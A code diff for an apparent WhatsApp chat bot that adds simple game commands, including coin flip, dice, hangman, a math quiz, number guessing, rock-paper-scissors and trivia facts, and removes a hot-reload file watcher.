+case 'coinflip':
+case 'flipcoin': {
+    const outcomes = ['Heads 🪙', 'Tails 🪙'];
+    reply(`🪙 *Coin Flip*\n\nResult: *${outcomes[Math.floor(Math.random() * outcomes.length)]}*`);
+}
+break;
+
+// ── coinbattle — Coin flip battle ──
+case 'coinbattle':
+case 'coinflipbattle': {
+    const txt = text?.trim() || '';
+    if (!txt && !m.quoted) return reply(`🎮 *Usage:* ${prefix}coinbattle <name>\nOr reply to someone's message\n\nExample: ${prefix}coinbattle @user`);
+    const opponent = m.quoted?.sender || m.mentionedJid?.[0] || null;
+    const oppName = opponent ? `@${opponent.split('@')[0]}` : txt;
+    if (opponent === m.sender) return reply(`❌ You can't battle yourself!`);
+    const result = Math.floor(Math.random() * 2) ? m.sender : opponent;
+    const resultName = result === m.sender ? 'YOU' : oppName;
+    reply(`⚔️ *Coin Battle* ⚔️\n\n${pushname} vs ${oppName}\n\n*Winner:* ${resultName} 🏆\n*Result:* ${Math.random() > 0.5 ? 'Heads 🪙' : 'Tails 🪙'}`);
+}
+break;
+
+// ── dice — Roll a dice ──
+case 'dice':
+case 'diceroll':
+case 'rolldice': {
+    const sides = parseInt(text?.trim()) || 6;
+    if (sides < 2 || sides > 100) return reply(`🎲 *Usage:* ${prefix}dice [sides]\n\nDefault is 6, max 100.`);
+    const roll = Math.floor(Math.random() * sides) + 1;
+    reply(`🎲 *Dice Roll* (d${sides})\n\nResult: *${roll}*`);
+}
+break;
+
+// ── emojiquiz — Emoji Quiz ──
+case 'emojiquiz':
+case 'emojiq':
+case 'emojigame': {
+    const emojiQuizzes = [
+        { emoji: '🐶🍝', answer: 'hot dog' },
+        { emoji: '🚗💤', answer: 'car sleep' },
+        { emoji: '🍎🍏', answer: 'apple' },
+        { emoji: '🍕🍔🍟', answer: 'fast food' },
+        { emoji: '🌊🏄', answer: 'surfing' },
+        { emoji: '🎵🎶', answer: 'music' },
+        { emoji: '🏀🏈⚽', answer: 'sports' },
+        { emoji: '📚✏️', answer: 'school' },
+        { emoji: '☕🧁', answer: 'coffee' },
+        { emoji: '✈️🌍', answer: 'travel' },
+        { emoji: '🎬🍿', answer: 'movies' },
+        { emoji: '🛒🛍️', answer: 'shopping' },
+        { emoji: '🎂🎉', answer: 'birthday' },
+        { emoji: '🏥💊', answer: 'hospital' },
+        { emoji: '🔬🧪', answer: 'science' },
+    ];
+    const q = emojiQuizzes[Math.floor(Math.random() * emojiQuizzes.length)];
+    reply(`🧩 *Emoji Quiz*\n\nGuess the word/ phrase:\n\n${q.emoji}\n\nType your answer!\n\n*(Answer: ${q.answer})*`);
+}
+break;
+
+// ── gamefact — Random game fact ──
+case 'gamefact':
+case 'gamingfact': {
+    const facts = [
+        "The first video game ever created was 'Tennis for Two' in 1958.",
+        "Mario was originally called 'Jumpman' in the Donkey Kong arcade game.",
+        "The most expensive game to develop is Grand Theft Auto V at $265 million.",
+        "The original PAC-MAN was called 'Puck-Man' in Japan.",
+        "Tetris was created by a Russian programmer in 1984.",
+        "The PlayStation was originally a joint project between Sony and Nintendo.",
+        "Pikachu was originally going to be named 'Pikachu' as a combination of two Japanese words.",
+        "The longest video game marathon is 138 hours playing Sonic the Hedgehog.",
+        "There are over 1 million games on the App Store.",
+        "The best-selling game of all time is Minecraft with over 238 million copies."
+    ];
+    reply(`🎮 *Game Fact*\n\n${facts[Math.floor(Math.random() * facts.length)]}`);
+}
+break;
+
+// ── guess — Number guessing game ──
+case 'guess':
+case 'guessnumber':
+case 'numberguess': {
+    const { guessGames } = global;
+    const active = global.guessGames?.[m.chat];
+    if (active && !active.over) {
+        return reply(`🔢 A game is already active in this chat!\nGuess a number between *${active.min}* and *${active.max}*`);
+    }
+    const min = 1;
+    const max = 20;
+    const target = Math.floor(Math.random() * (max - min + 1)) + min;
+    if (!global.guessGames) global.guessGames = {};
+    global.guessGames[m.chat] = { target, min, max, attempts: 0, over: false };
+    reply(`🔢 *Number Guess Game*\n\nI'm thinking of a number between *${min}* and *${max}*.\nType *${prefix}guess <number>* to guess!\n\n_You have 5 attempts._`);
+    // Auto-cleanup after 2 minutes
+    setTimeout(() => { if (global.guessGames?.[m.chat]) delete global.guessGames[m.chat]; }, 120000);
+}
+break;
+
+// ── hangman — Hangman game ──
+case 'hangman':
+case 'hangmangame': {
+    const words = ['CYBER', 'PYTHON', 'JAVASCRIPT', 'WHATSAPP', 'BOT', 'HACKER', 'SECURITY', 'NETWORK', 'SERVER', 'DATABASE'];
+    const word = words[Math.floor(Math.random() * words.length)];
+    if (!global.hangmanGames) global.hangmanGames = {};
+    if (global.hangmanGames[m.chat]) return reply(`🎯 A Hangman game is already active!\nType *${prefix}hangguess <letter>*`);
+    global.hangmanGames[m.chat] = {
+        word,
+        guessed: new Set(),
+        attempts: 6,
+        over: false
+    };
+    const display = word.split('').map(l => '_').join(' ');
+    reply(`🎯 *Hangman*\n\nWord: ${display}\n\nAttempts left: 6 ❤️\n\nType *${prefix}hangguess <letter>* to guess!`);
+    setTimeout(() => { if (global.hangmanGames?.[m.chat]) delete global.hangmanGames[m.chat]; }, 300000);
+}
+break;
+
+// ── math — Solve math problem ──
+case 'math':
+case 'maths':
+case 'mathquiz': {
+    if (!global.mathGames) global.mathGames = {};
+    if (global.mathGames[m.chat]) return reply(`🧮 A math game is already active in this chat!\nType the answer to the current question.`);
+    const ops = ['+', '-', '*'];
+    const op = ops[Math.floor(Math.random() * ops.length)];
+    const a = Math.floor(Math.random() * 20) + 1;
+    const b = Math.floor(Math.random() * 20) + 1;
+    let answer;
+    switch (op) {
+        case '+': answer = a + b; break;
+        case '-': answer = a - b; break;
+        case '*': answer = a * b; break;
+    }
+    global.mathGames[m.chat] = { answer, a, b, op, attempts: 0, over: false };
+    reply(`🧮 *Math Quiz*\n\nWhat is *${a} ${op} ${b}*?\n\nType *${prefix}mathans <answer>* to submit!`);
+    setTimeout(() => { if (global.mathGames?.[m.chat]) delete global.mathGames[m.chat]; }, 120000);
+}
+break;
+
+// ── mathfact — Random math fact ──
+case 'mathfact':
+case 'mathematicsfact': {
+    try {
+        const { data } = await axios.get(`http://numbersapi.com/${Math.floor(Math.random() * 1000) + 1}/math`, { timeout: 5000 });
+        reply(`🔢 *Math Fact*\n\n${data}`);
+    } catch (e) {
+        const fallbacks = [
+            "Zero is the only number that can't be represented in Roman numerals.",
+            "A 'jiffy' is an actual unit of time: 1/100th of a second.",
+            "The number Pi (π) has been calculated to over 100 trillion digits.",
+            "The sum of all numbers from 1 to 100 is 5050.",
+            "There are 6! (720) ways to arrange 6 people around a table."
+        ];
+        reply(`🔢 *Math Fact*\n\n${fallbacks[Math.floor(Math.random() * fallbacks.length)]}`);
+    }
+}
+break;
+
+// ── numbattle / numberbattle — Number battle game ──
+case 'numbattle':
+case 'numberbattle': {
+    if (!m.isGroup) return reply(`👥 *Groups only!*`);
+    const target = m.mentionedJid?.[0] || m.quoted?.sender;
+    if (!target) return reply(`🎮 *Usage:* ${prefix}numbattle @user\n\nTag someone to battle!`);
+    if (target === m.sender) return reply(`❌ You can't battle yourself!`);
+    const myNum = Math.floor(Math.random() * 100) + 1;
+    const theirNum = Math.floor(Math.random() * 100) + 1;
+    let result;
+    if (myNum > theirNum) result = `${pushname} 🏆`;
+    else if (theirNum > myNum) result = `@${target.split('@')[0]} 🏆`;
+    else result = "It's a tie! 🤝";
+    reply(`⚔️ *Number Battle* ⚔️\n\n${pushname} → ${myNum}\n@${target.split('@')[0]} → ${theirNum}\n\n🏆 *Winner:* ${result}`);
+}
+break;
+
+// ── rps — Rock Paper Scissors ──
+case 'rps':
+case 'rockpaperscissors': {
+    const choices = ['rock 🪨', 'paper 📄', 'scissors ✂️'];
+    const userChoice = text?.trim().toLowerCase();
+    if (!userChoice || !['rock', 'paper', 'scissors'].includes(userChoice)) {
+        return reply(`🎮 *RPS*\n\nUsage: ${prefix}rps <rock|paper|scissors>\n\nExample: ${prefix}rps rock`);
+    }
+    const botChoice = choices[Math.floor(Math.random() * 3)];
+    let result;
+    const u = userChoice[0];
+    const b = botChoice[0];
+    if (u === b) result = "It's a tie! 🤝";
+    else if ((u === 'r' && b === 's') || (u === 'p' && b === 'r') || (u === 's' && b === 'p'))
+        result = "You win! 🎉";
+    else
+        result = "You lose! 😢";
+    reply(`🪨 📄 ✂️ *Rock Paper Scissors*\n\nYou: ${userChoice} ${result === 'You win! 🎉' ? '👑' : ''}\nBot: ${botChoice} ${result === 'You lose! 😢' ? '👑' : ''}\n\n*${result}*`);
+}
+break;
+
+// ── rpsls — Rock Paper Scissors Lizard Spock ──
+case 'rpsls':
+case 'rpslizardspock': {
+    const choices = ['rock 🪨', 'paper 📄', 'scissors ✂️', 'lizard 🦎', 'spock 🖖'];
+    const userChoice = text?.trim().toLowerCase();
+    if (!userChoice || !['rock', 'paper', 'scissors', 'lizard', 'spock'].includes(userChoice)) {
+        return reply(`🎮 *RPSLS*\n\nUsage: ${prefix}rpsls <rock|paper|scissors|lizard|spock>\n\nExample: ${prefix}rpsls spock`);
+    }
+    const botChoice = choices[Math.floor(Math.random() * 5)];
+    const rules = {
+        'rock': ['scissors', 'lizard'],
+        'paper': ['rock', 'spock'],
+        'scissors': ['paper', 'lizard'],
+        'lizard': ['spock', 'paper'],
+        'spock': ['scissors', 'rock']
+    };
+    let result;
+    if (userChoice === botChoice.split(' ')[0]) result = "It's a tie! 🤝";
+    else if (rules[userChoice].includes(botChoice.split(' ')[0])) result = "You win! 🎉";
+    else result = "You lose! 😢";
+    reply(`🪨 📄 ✂️ 🦎 🖖 *RPSLS*\n\nYou: ${userChoice} ${result === 'You win! 🎉' ? '👑' : ''}\nBot: ${botChoice} ${result === 'You lose! 😢' ? '👑' : ''}\n\n*${result}*`);
+}
+break;
+
+// ── hangguess — Guess a letter in Hangman ──
+case 'hangguess':
+case 'hangmanguess': {
+    if (!global.hangmanGames?.[m.chat]) return reply(`🎯 No active Hangman game! Start one with ${prefix}hangman`);
+    const game = global.hangmanGames[m.chat];
+    if (game.over) return reply(`🎯 Game is over! Start a new one with ${prefix}hangman`);
+    const letter = text?.trim().toUpperCase();
+    if (!letter || letter.length !== 1 || !/^[A-Z]$/.test(letter))
+        return reply(`📝 *Usage:* ${prefix}hangguess <letter>\n\nExample: ${prefix}hangguess A`);
+    if (game.guessed.has(letter)) return reply(`⚠️ '${letter}' was already guessed!`);
+    game.guessed.add(letter);
+    if (game.word.includes(letter)) {
+        const display = game.word.split('').map(l => game.guessed.has(l) ? l : '_').join(' ');
+        if (!display.includes('_')) {
+            game.over = true;
+            reply(`🎉 *You won!*\n\nWord: *${game.word}*`);
+            delete global.hangmanGames[m.chat];
+        } else {
+            reply(`✅ Correct!\n\nWord: ${display}\n\nAttempts left: ${'❤️'.repeat(game.attempts)}`);
+        }
+    } else {
+        game.attempts--;
+        if (game.attempts <= 0) {
+            game.over = true;
+            reply(`💀 *Game Over!*\n\nWord was: *${game.word}*`);
+            delete global.hangmanGames[m.chat];
+        } else {
+            const display = game.word.split('').map(l => game.guessed.has(l) ? l : '_').join(' ');
+            reply(`❌ Wrong!\n\nWord: ${display}\n\nAttempts left: ${'❤️'.repeat(game.attempts)}`);
+        }
+    }
+}
+break;
+
+// ── mathans — Answer math quiz ──
+case 'mathans':
+case 'mathanswer':
+case 'mathquizanswer': {
+    if (!global.mathGames?.[m.chat]) return reply(`🧮 No active math quiz! Start one with ${prefix}math`);
+    const game = global.mathGames[m.chat];
+    if (game.over) return reply(`🧮 Game is over! Start a new one with ${prefix}math`);
+    const userAns = parseInt(text?.trim());
+    if (isNaN(userAns)) return reply(`🔢 *Usage:* ${prefix}mathans <number>\n\nExample: ${prefix}mathans 42`);
+    game.over = true;
+    if (userAns === game.answer) {
+        reply(`✅ *Correct!*\n\n${game.a} ${game.op} ${game.b} = ${game.answer}`);
+    } else {
+        reply(`❌ *Wrong!*\n\n${game.a} ${game.op} ${game.b} = ${game.answer}\n\nYour answer: ${userAns}`);
+    }
+    delete global.mathGames[m.chat];
+}
+break;
+
+// ── guessans — Answer number guess ──
+case 'guessans':
+case 'guessanswer':
+case 'guessnum': {
+    if (!global.guessGames?.[m.chat]) return reply(`🔢 No active guess game! Start one with ${prefix}guess`);
+    const game = global.guessGames[m.chat];
+    if (game.over) return reply(`🔢 Game is over! Start a new one with ${prefix}guess`);
+    const userGuess = parseInt(text?.trim());
+    if (isNaN(userGuess)) return reply(`🔢 *Usage:* ${prefix}guessans <number>\n\nExample: ${prefix}guessans 10`);
+    game.attempts++;
+    if (userGuess === game.target) {
+        game.over = true;
+        reply(`🎉 *Correct!* The number was ${game.target}!\n_Attempts: ${game.attempts}_`);
+        delete global.guessGames[m.chat];
+    } else if (userGuess < game.target) {
+        reply(`⬆️ Higher! (Attempt ${game.attempts}/5)`);
+    } else {
+        reply(`⬇️ Lower! (Attempt ${game.attempts}/5)`);
+    }
+    if (game.attempts >= 5 && !game.over) {
+        game.over = true;
+        reply(`💀 *Out of attempts!* The number was ${game.target}.`);
+        delete global.guessGames[m.chat];
+    }
+}
+break;
+
 case 'goodbye': {
     if (!m.isGroup) return reply(`👥 *Groups only!*`);
     if (!isCreator && !isAdmins) return reply(`🔒 *Admin only!*`);
@@ -17087,6 +18391,9 @@ case 'goodbye': {
 break;
 
 case 'linkgc':
+// ✅ FIX: duplicate 'grouplink' case removed — first occurrence at line ~12745 is the active one
+// (In JS switch, only the first matching case runs; this was dead code)
+
 case 'listadmins':
 case 'admins':
 case 'adminlist': {
@@ -18419,7 +19726,7 @@ default:
           }
           break;
       }
-  
+
     // If no command matched, just ignore
     break;
 }
@@ -18435,10 +19742,4 @@ default:
   }
 }
 
-let file = require.resolve(__filename);
-require('fs').watchFile(file, () => {
-    require('fs').unwatchFile(file);
-    console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
-    delete require.cache[file];
-    require(file);
-});
+// watchFile removed — dangerous in multi-bot
